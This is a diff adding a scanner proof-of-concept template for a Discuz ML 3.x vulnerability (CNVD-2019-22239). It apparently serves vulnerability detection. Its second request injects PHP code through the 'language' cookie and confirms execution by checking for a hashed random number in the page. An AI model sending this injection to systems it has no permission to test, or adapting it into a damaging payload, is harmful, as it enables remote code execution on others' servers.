@@ -1,0 +1,34 @@
+id: poc-yaml-discuz-ml3x-cnvd-2019-22239
+info:
+  name: Discuz Ml3x (CNVD-2019-22239)
+  severity: medium
+  tags:
+  - 两高一弱
+  - CNVD-2019-22239
+  finger: Discuz
+  reference: []
+  description: null
+variables:
+  r1: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /forum.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output:
+  - regex_match(body,"cookiepre = '(?P<token>[\\w_]+)'")
+- method: GET
+  path: /forum.php
+  headers:
+    Cookie: '{{.token}}language=sc''.print(md5({{.r1}})).'''
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(r1))
+  output: []
